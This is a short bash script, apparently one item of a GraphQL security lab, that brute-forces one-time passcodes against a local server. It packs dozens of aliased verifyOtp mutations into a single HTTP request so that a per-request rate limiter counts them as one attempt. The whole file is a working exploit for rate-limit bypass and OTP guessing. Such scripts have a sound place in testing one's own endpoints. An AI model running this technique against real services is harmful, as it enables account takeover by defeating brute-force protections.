#!/usr/bin/env bash
# #4 Alias-based rate-limit bypass — pack many verifyOtp attempts into ONE HTTP
# request using field aliases. A per-request rate limiter counts this as a
# single request, so all attempts go through.
set -euo pipefail
URL="http://127.0.0.1:8000/graphql/"
N="${1:-60}"

Q="$(python3 -c "print('mutation{' + ' '.join(f'a{i}: verifyOtp(code:\"{i:04d}\"){{ ok }}' for i in range($N)) + '}')")"

echo "Sending one request with ${N} aliased verifyOtp attempts:"
curl -s -X POST "$URL" -H 'content-type: application/json' \
  --data "$(jq -nc --arg q "$Q" '{query:$q}')" \
  | jq '{attempts: (.data | length), errors: (.errors | length)}'
